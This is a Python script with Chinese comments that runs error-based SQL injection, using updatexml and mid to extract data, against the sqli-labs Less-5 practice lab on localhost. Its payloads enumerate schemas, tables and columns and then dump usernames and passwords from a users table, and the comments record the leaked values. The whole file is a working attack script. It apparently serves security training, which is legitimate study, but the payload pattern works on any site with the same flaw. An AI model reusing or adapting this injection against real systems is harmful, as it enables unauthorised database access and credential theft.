import requests

# inject_type = string  报错注入
inject_num = "1'"
# mid()函数起始位置初始化
start_pos = 32

# 报错注入

# poc 填写 sql注入语句
# 查询所有数据库名称
poc = 'select group_concat(schema_name) from information_schema.schemata'  #~information_schema,challenges,mysql,performance_schema,pikachu,pkxss,security,sgsec,shuju,sys
# 查询数据库中的所有表名
table_schema='security'
poc = f"select group_concat(table_name) from information_schema.tables where table_schema='{table_schema}'" #~emails,referers,uagents,users~
# 查询表中的所有字段
table_name='users'
poc = f"select group_concat(column_name) from information_schema.columns where table_name='{table_name}' and table_schema='{table_schema}' "
# 查询表中所有的内容
ziduan='username,0x7e,password'
poc = f"select group_concat({ziduan}) from {table_name}" #~Dumb~Dumb,Angelina~I-kill-you,Dummy~p@ssword,secure~crappy
print(poc)
exp = f"{inject_num} and updatexml(1,concat(0x7e,mid(({poc}),{start_pos},31),0x7e),1)#"
print(exp)
parms = {'id': exp}
url = "http://localhost/sqli-labs/Less-5/"

def get_fun():
    results = requests.get(url,params=parms).text
    print(results)

if __name__ == '__main__':
    get_fun()